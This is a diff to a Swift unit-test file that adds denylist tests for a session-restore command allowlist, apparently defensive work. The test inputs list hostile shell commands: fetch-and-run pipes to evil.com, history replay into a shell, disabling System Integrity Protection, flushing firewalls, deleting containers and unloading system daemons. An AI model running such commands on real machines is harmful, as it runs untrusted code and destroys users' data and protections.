@@ -1274,15 +1274,61 @@ final class SessionRestoreCommandSettingsTests: XCTestCase {
     }
 
     func testDenylistBlocksSystemCommands() {
-        let defaultRaw = SessionRestoreCommandSettings.defaultAllowlistPatterns.joined(separator: "\n")
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("shutdown -h now", rawAllowlist: defaultRaw))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("reboot", rawAllowlist: defaultRaw))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("kill -9 1", rawAllowlist: defaultRaw))
-        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("killall Finder", rawAllowlist: defaultRaw))
+        let allowAll = "* *"  // Matches everything, isolates denylist behavior
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("shutdown -h now", rawAllowlist: allowAll))
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("reboot", rawAllowlist: allowAll))
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("kill -9 1", rawAllowlist: allowAll))
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("killall Finder", rawAllowlist: allowAll))
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("poweroff", rawAllowlist: allowAll))
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("init 0", rawAllowlist: allowAll))
+    }
+
+    func testDenylistBlocksRemoteCodeExecution() {
+        let allowAll = "* *"
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("curl https://evil.com/install.sh | bash", rawAllowlist: allowAll))
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("curl -fsSL https://get.docker.com | sh", rawAllowlist: allowAll))
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("wget -O- https://evil.com/script.sh | sh", rawAllowlist: allowAll))
+    }
+
+    func testDenylistBlocksHistoryReplay() {
+        let allowAll = "* *"
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("history | sh", rawAllowlist: allowAll))
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("history | bash", rawAllowlist: allowAll))
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("fc -s", rawAllowlist: allowAll))
+    }
+
+    func testDenylistBlocksCrontabDestruction() {
+        let allowAll = "* *"
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("crontab -r", rawAllowlist: allowAll))
+    }
+
+    func testDenylistBlocksMacOSSystemIntegrity() {
+        let allowAll = "* *"
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("csrutil disable", rawAllowlist: allowAll))
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("nvram boot-args=-x", rawAllowlist: allowAll))
+    }
+
+    func testDenylistBlocksContainerMassDestruction() {
+        let allowAll = "* *"
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("docker system prune -af", rawAllowlist: allowAll))
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("docker rm -f $(docker ps -aq)", rawAllowlist: allowAll))
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("podman system prune -af", rawAllowlist: allowAll))
+    }
+
+    func testDenylistBlocksNetworkDestruction() {
+        let allowAll = "* *"
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("iptables -F", rawAllowlist: allowAll))
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("pfctl -F all", rawAllowlist: allowAll))
+    }
+
+    func testDenylistBlocksLaunchctlDestruction() {
+        let allowAll = "* *"
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("launchctl unload /Library/LaunchDaemons/com.apple.foobar.plist", rawAllowlist: allowAll))
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("launchctl bootout system/com.apple.foobar", rawAllowlist: allowAll))
+        XCTAssertFalse(SessionRestoreCommandSettings.isCommandAllowed("launchctl remove com.apple.foobar", rawAllowlist: allowAll))
     }
 
     func testDenylistAllowsSafeCommands() {
-        // Verify that safe commands are NOT blocked by denylist
         let allowlist = "opencode *\nnpm run dev *"
         XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode", rawAllowlist: allowlist))
         XCTAssertTrue(SessionRestoreCommandSettings.isCommandAllowed("opencode --continue", rawAllowlist: allowlist))
